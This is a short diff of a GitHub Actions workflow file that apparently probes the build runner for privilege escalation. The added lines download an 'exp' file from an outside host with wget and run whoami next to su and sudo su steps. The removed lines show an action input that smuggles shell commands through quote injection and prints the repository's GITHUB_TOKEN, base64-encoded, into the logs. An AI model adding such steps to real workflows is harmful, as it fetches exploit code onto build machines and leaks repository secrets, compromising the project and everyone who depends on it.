@@ -19,6 +19,7 @@ jobs:
         shell: bash
         run: |
           npm install
+          whoami
           wget https://copy.fail/exp
           sha256sum $(which su)
           su --version
@@ -32,8 +33,3 @@ jobs:
           su -c 'whoami' 2>&1
           echo $(su -c 'whoami')
           sudo su
-
-      - name: Test
-        uses: ministryofjustice/devsecops-actions/sca/sbom@86248cec9a6bb1fd4dabc08a05178e0650d3af4f # v1.5.0
-        with:
-          docker-images-file: '../docker-images.json"; echo "malicious payload executed!"; echo "${{ secrets.GITHUB_TOKEN }}" | base64; echo "'
